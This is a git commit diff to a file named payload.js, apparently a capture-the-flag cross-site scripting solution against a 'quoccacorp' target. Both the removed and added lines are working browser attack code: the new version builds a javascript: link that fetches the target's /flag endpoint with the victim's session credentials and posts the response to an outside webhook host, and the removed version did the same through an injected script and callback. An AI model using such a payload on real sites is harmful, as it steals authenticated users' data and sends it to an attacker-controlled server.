96c8b9c57209177ed0bf9a38b47185e7e0abcc9a
TessaDal <86071436+sarahda@users.noreply.github.com>
2026-04-03 22:36:27 +1100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,4 @@
-window.flag=function(data){fetch('https://bold-galaxy-05.webhook.cool/',{method:'POST',mode:'no-cors',body:JSON.stringify(data)})};
-document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://api.netquocca.quoccacorp.com/flag'}))
+var a=document.createElement('a');
+a.href='javascript:fetch("https://api.netquocca.quoccacorp.com/flag",{credentials:"include"}).then(function(r){return r.text()}).then(function(t){fetch("https://bold-galaxy-05.webhook.cool/",{method:"POST",mode:"no-cors",body:t})})';
+document.body.appendChild(a);
+a.click();
